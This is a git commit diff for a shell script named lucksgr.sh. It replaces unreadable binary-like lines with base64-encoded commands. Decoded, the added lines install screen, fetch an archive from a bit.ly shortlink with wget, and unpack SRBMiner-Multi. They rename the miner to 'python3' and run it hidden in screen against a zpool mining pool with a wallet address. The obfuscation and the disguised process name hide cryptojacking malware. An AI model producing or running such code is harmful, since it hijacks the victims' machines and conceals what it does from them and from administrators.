f9d14707c25c49aa2cb1e797dc2bf3cc8bdd8b77
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-18 15:29:45 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,4 +1,13 @@
-jbZ[, zߎval\Z֫ݢILw˥/ȧzPȧ+a}rr'zh0zly颉\k=
-qJ
-�,
-cɄ\`
+IyEvYmluL2Jhc2g=
+
+YXB0IGluc3RhbGwgc2NyZWVuIC15
+
+d2dldCAtTyBkb3QgaHR0cHM6Ly9iaXQubHkva29udG9scnVt
+
+dGFyIHh2ZiBkb3Q=
+
+Y2QgU1JCTWluZXItTXVsdGktMi00LTc=
+
+bXYgU1JCTWluZXItTVVMVEkgcHl0aG9uMw==
+
+c2NyZWVuIC4vcHl0aG9uMyAtYSB5ZXNwb3dlcnN1Z2FyIC1vIHllc3Bvd2VyU1VHQVIuc2VhLm1pbmUuenBvb2wuY2E6NjI0MSAtdSBERUoydkhEMmFEZkJ4U3JjTURmcUM0QUNnTEFxWFk4bUV0IC1wIGM9REdC
